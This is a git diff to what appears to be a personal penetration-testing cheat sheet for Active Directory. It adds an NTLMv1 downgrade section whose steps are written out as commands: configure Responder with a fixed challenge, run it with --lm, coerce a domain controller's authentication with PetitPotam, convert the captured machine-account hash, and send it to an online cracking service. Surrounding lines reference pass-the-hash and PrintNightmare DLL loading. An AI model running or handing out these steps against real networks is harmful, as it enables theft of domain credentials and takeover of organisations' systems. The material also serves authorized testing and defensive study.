@@ -71,6 +71,9 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 * **[Low Hanging Fruits](#low-hanging-fruits)**
 	* [ZeroLogon](#zerologon)
 	* [HiveNightmare](#hivenightmare)
+* **[NTLMv1 Shenanigans](#ntlmv1-shenanigans)**
+	* [NTLM Downgrade](#ntlm-downgrade)
+	* [Relay SMB to LDAP](#relay-smb-to-ldap)
 * **[PrintNightmare](#printnightmare)**
 * **[noPac](#nopac)**
 * **[Active Directory Certificate Service](#ADCS)**
@@ -804,6 +807,27 @@ secretsdump.py -sam SAM-file -system SYSTEM-file LOCAL
 ```
 
 Note that the above methods is the manual way. This has been implemented in a automated C# code called [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare). Once you retrieve admin's ntlm, you can do lots of stuff including [changing password](https://twitter.com/gentilkiwi/status/1417467063883476992) or [Pass The Hash](#overpass-the-hash-opth)/PsExec/Evil-Winrm...
+
+# NTLMv1 Shenanigans
+### NTLM Downgrade
+For below steps, it requires a specific challenge needed to be configured in `/etc/responder/Responder.conf`. Modify the challenge part to _1122334455667788_ in order to match with [crack.sh](https://crach.sh) rainbow tables.
+
+1. Run responder with `--lm` flag. _(Note that in order to get a crackable hash for NTLMv1-SSP hash --disable-ess flag is required. Refer this tweet by [@HackAndDo](https://twitter.com/HackAndDo/status/1420135330171207685?s=20&t=0_1oqdiizE_Hbs5XKByHEw))_
+```
+responder -I eth0 --lm [--disable-ess]
+```
+2. Coerce authentication with your own methods (i.e. PetitPotam, DFSCoerce, PrinterBug).
+```
+python3 PetitPotam.py 192.168.86.193 192.168.86.182
+```
+3. A hash should appear on responder event logs. Convert the hash to a crack.sh cracking format with this [tool](https://github.com/evilmog/ntlmv1-multi). Refer steps explained in http://crack.sh/netntlm/
+```
+python3 ntlmv1.py --ntlmv1 'DC01$::RANGE:B8154B285809096F4AA9D8285846C401CDE8D2F1FBE4AC91:B8154B285809096F4AA9D8285846C401CDE8D2F1FBE4AC91:1122334455667788'
+```
+4. Submit hash to https://crack.sh/get-cracking and wait for the result (should be retrieved via email within seconds)
+
+### Relay SMB to LDAP
+KIV. Can refer to this [link](https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/)
 
 # PrintNightmare
 Abusing printer spooler service (CVE-2021-34527) to load malicious DLL and execute as SYSTEM. Available POCs can be found here
